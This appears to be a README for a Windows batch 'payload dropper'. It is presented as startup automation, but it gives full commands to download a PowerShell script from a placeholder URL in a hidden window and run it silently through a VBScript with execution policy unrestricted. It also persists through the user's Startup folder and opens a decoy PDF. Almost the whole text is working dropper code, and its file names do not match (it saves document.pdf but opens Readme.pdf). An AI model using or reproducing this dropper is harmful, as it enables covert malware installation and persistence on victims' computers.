# batch_payload_dropper

This batch script, is designed to automate certain tasks during system startup by utilizing the Windows Startup mechanism. It involves downloading a PowerShell script and a PDF document from specified URLs and silently executing the PowerShell script upon system startup.

## Here's a breakdown of the script:

1. **Downloading and Execution Steps:**
   - Change directory to the user's temporary folder:
     ```batch
     cd "%USERPROFILE%\AppData\Local\Temp\"
     ```

   - Create a VBScript file (`run.vbs`) to run the PowerShell script (`script.ps1`) silently:
     ```batch
     echo command = "powershell.exe -nologo -ExecutionPolicy Unrestricted -File %temp%\script.ps1" >run.vbs
     echo set shell = CreateObject("WScript.Shell") >>run.vbs
     echo shell.Run command,0 >>run.vbs
     ```

   - Download the PowerShell script (`script.ps1`) from your desired URL using PowerShell:
     ```batch
     powershell.exe -WindowStyle hidden wget <your_script_url> -OutFile %TEMP%\script.ps1
     ```

   - Download other necessary files similarly, e.g., a PDF document:
     ```batch
     powershell.exe -WindowStyle hidden wget <your_pdf_url> -OutFile %TEMP%\document.pdf
     ```

2. **Setting up Autorun:**
   - Change directory to the user's Startup folder:
     ```batch
     cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
     ```

   - Create a batch file (`autorun.bat`) to run the VBScript (`run.vbs`) on startup:
     ```batch
     echo wscript %USERPROFILE%\AppData\Local\Temp\run.vbs > autorun.bat
     ```

   - Start the `autorun.bat` script in the background using `start` command:
     ```batch
     start /B autorun.bat
     ```

3. **Open the PDF Document:**
   - Change directory back to the user's temporary folder:
     ```batch
     cd "%USERPROFILE%\AppData\Local\Temp\"
     ```

   - Open the PDF document (`Readme.pdf`) in the default PDF reader:
     ```batch
     start /max Readme.pdf
     ```

## Customization

- You can customize the URLs to download the PowerShell script and other files by replacing `<your_script_url>` and `<your_pdf_url>` with your desired URLs.

